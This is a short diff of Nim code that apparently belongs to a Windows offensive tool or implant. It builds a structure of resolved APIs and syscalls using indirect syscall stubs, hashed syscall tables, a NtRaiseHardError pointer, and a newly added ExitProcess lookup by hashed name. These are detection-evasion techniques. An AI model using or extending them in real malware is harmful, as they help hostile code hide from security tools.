@@ -1,10 +1,11 @@
-import gmh, gpa, str
+import gmh, gpa, str, hash
 
 import winim
 
 type
     doSyscall = proc (ssn: uint16, jmpAddr: uint64): NTSTATUS {.varargs, stdcall.}
     NtRaiseHardError = proc (status: uint64, count: uint64, mask: uint64, pargs: uint64, response: uint64): uint64 {.stdcall.}
+    ExitProcess = proc (uExitCode: UINT){.stdcall.}
     Syscall* = object
         pName*: PCHAR
         ord*: WORD
@@ -41,6 +42,7 @@ type
         pGlobalFree*: typeof(GlobalFree)
         pRtlInitUnicodeString*: typeof(RtlInitUnicodeString)
         pNtRaiseHardError*: typeof(NtRaiseHardError)
+        pExitProcess*: typeof(ExitProcess)
         syscalls*: array[500, ptr Syscall]
         syscallHashes*: array[500, uint32]
         syscallCount*: int
@@ -89,6 +91,7 @@ proc initNinst*(): ptr Ninst {.inline.} =
     pNinst.pVirtualFree = gpa(pNinst.hKernel32, "VirtualFreeEx", VirtualFreeEx)
     pNinst.pVirtualProtect = gpa(pNinst.hKernel32, "VirtualProtectEx", VirtualProtectEx)
     pNinst.pGetLastError = gpa(pNinst.hKernel32, "GetLastError", GetLastError)
+    pNinst.pExitProcess = cast[typeof(ExitProcess)](getProcAddressHash(pNinst.hKernel32, static(hashStrA("ExitProcess".cstring))))
 
     return pNinst
 
